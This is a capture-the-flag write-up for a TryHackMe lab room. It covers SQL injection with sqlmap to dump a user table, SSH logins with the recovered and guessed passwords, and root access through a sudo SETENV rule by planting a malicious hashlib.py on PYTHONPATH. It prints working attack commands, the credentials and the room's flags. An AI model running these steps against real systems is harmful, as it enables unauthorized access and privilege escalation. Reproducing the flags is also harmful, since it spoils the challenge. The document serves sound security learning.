---
{"dg-publish":true,"permalink":"/try-hack-me-rooms/bibloteca/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-24T11:00:25.212+02:00","updated":"2026-04-27T09:05:28.823+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
---

![](/img/user/Attachments/redteaming2.png)

--------
## Description


This room demonstrates vulnerabilities in: 
1. SQL Injection
2. Unencrypted/unhashed database credentials
3. Weak passwords for all users on the system
4. Python Hijacking / PATH environmental hijacking 
5. (Also vulnerable to Pwnkit)
6. SETUID-binaries

---------
## Recon

As always a full nmap scan is required to discover running services and active ports on the system. 

![](/img/user/Attachments/nmap1%201.png)

Once the running ports and services are discovered we move forward to enumerating the identified services and ports. 

![](/img/user/Attachments/nmap2%201.png)


-------
## Enumeration


![](/img/user/Attachments/homepage%203.png)

While fuzzing the webapp for hidden endpoints nothing really came up. The Nmap scan shows 2 open ports **22 for SSH** and **8000** for a webserver. Nothing much to go on on the web server. It is possible to create an account. However there is a hint from the THM instructions. **Hit em with the classics***  so let's do that.

![](/img/user/Attachments/session-managemenet.png)

Initially first thing which came to mind was to brute-force the username/password with hydra. Session management is confirmed by the use of cookies. Initially attempting focusing on doing dictionary attacks on the login page and the ssh service was not a success. I tried many different wordlists without any luck. Finally, moving to a different attack vector `sqlmap`
it was a success. 

---

## Exploitation

### SQL Injection

Target is vulnerable to sqli injection. 

```bash
sqlmap --batch -r login.req --level=5
```


![](/img/user/Attachments/sqlmmap-success.png)

Target is vulnerable to sqli injection. So, from the sqlmap tool the payload is given. Let's use that  to authenticate on the login page. 

```bash
sqlmap --batch -r login.req --level=5 --dbs
```

Let's look for the databases.

![](/img/user/Attachments/dbs.png)

```bash
sqlmap --batch -r login.req --level=5 -D website --tables
```

Let's choose `website` database and enumerate the tables.

![](/img/user/Attachments/users.png)


```bash
sqlmap --batch -r login.req --level=5 -D website -T users --dump
```

It's looking good so far. Let's dump the contents.

![](/img/user/Attachments/sql-jackpot.png)

So, it's a success. Account credentials are retrieved. Let's use these creds to authenticate on the web server.

```bash

# Credentials

username: smokey
email: smokey@email.boop
password: My_P@ssW0rd123

```


![](/img/user/Attachments/smokey-login.png)

The credentials work but no flag is seen on smokey's dashboard. 


----
## Post-exploitation

### SSH 

```bash
ssh smokey@TARGET 
```

![](/img/user/Attachments/smokey-ssh.png)


The credentials work for SSH. Let's check out the classics. The directory for smokey is empty. 

![](/img/user/Attachments/existingusers.png)

So, there are other users on the system. **hazel**. Let's see if its possible to explore. 

![](/img/user/Attachments/hazel-directory.png)


So, **root** can read/write these files. and **hazel** can read both files. For everyone else its **permission denied**. Sadly. Time for some linux priv escalation classics.

```bash
smokey@ip-10-114-167-160:/home/hazel$ sudo -l  
[sudo] password for smokey:  
Sorry, user smokey may not run sudo on ip-10-114-167-160.
```

Sadly, smokey's permissions are limited. Checking for cronjobs there are sadly no jobs running on a schedule so nothing to exploit there. Maybe it's time for some automation scripts. 

----

### SSH as Hazel - First Flag

Using hydra to find the password for **hazel** didnt work. Trying the username as a password did. 

```bash
ssh hazel@TARGET
```

Logging in as hazel with SSH gets read access to both files in the directory which were not readable as the user **smokey**. Now 1st flag is acquired.

`THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}` 

Checking out the **hasher.py** it seems it is a python script which encodes the input you give it in 2 different hashing algorithms namely SHA-1 and SHA-256. 



-----

### Moving to LES 

Let's use Linux Exploit Suggester.

**Downloading les.sh to target machine**
```bash

# Copy les.sh to current directory
cp /opt/les.sh . 

# start python http server 
python -m http.server 8000

# in smokey's directory, download it to target machine
wget http://IP:8000/les.sh

# make it executable
chmod +x 

# run it 
./les.sh

```

![](/img/user/Attachments/les.png)

Running **les** gives numerous possible exploits. 

```bash

# Checking kernel info and ubuntu release version
uname -a 
```

```bash
Linux ip-10-114-167-160 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

Let's have a look at the ubuntu version running on the target and the kernel. So the kernel version is **5.15.0-138-generic** and the ubuntu release is **20.04.1**. Due to compilation troubles it was pretty difficult acquiring a workable exploit on the target machine. 

Trying the **pwnkit** approach which is confirmed to be vulnerable on the target due to **/usr/bin/pkexec** running the unpatched version it was not possible to compile and run the exploit to gain root. 

It was also difficult transferring the necessary files to target machine. For some reason it's no problem to download from my machine to target but from the web to target the connection just hangs. 

### Rooting as Hazel

So, let's check out the options for privesc as Hazel.

![](/img/user/Attachments/hazel-sudo-l.png)

Looks like hazel is able to run python and hasher.py with root privileges. This is the way to own the system. Finally. 


```bash

# Let's create the malicious hashlib
echo 'import os; os.system("/bin/bash -p")' > /tmp/hashlib.py

# let's add it to the PATH
sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py
```

And root is achieved. Now /root/root.txt can be read.

`THM{PytH0n_LiBr@RY_H1j@acKIn6}`

Root flag is acquired.

**Breakdown of the Exploit**
```bash
# sudo-l reveals hazel can change the environmental variables > SETENV
# Thus we can tell python where to look for modules it's using to run hasher.py.

1. First create the malicious hashlib.py since hasher.py is using it.
2. Second add /tmp to the PYTHONPATH where the malicious hashlib.py is stored.
3. Also add the hasher.py to PYTHONPATH


# Sets the /tmp to the PYTHON environmental path
sudo PYTHONPATH=/tmp /usr/bin/python3 /home/hazel/hasher.py

This vulnerability arises due to this rule:
(root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py

What comes after /tmp allows to execute the hasher.py python3 with root privileges 


---
hasher.py runs as root
→ imports hashlib
→ Python searches PYTHONPATH first (/tmp)
→ finds the malicious /tmp/hashlib.py
→ executes it as root instead of real hashlib
→ the os.system("/bin/bash -p") runs as root
→ root shell spawns

```

------
## Attack Pattern Analysis (APA)

nmap > reveals webapp vulnerable to SQLi > sqlmap gives ssh credentials > hazel has weak credentials for ssh also > user flag > PATH environmental hijacking with Python > root  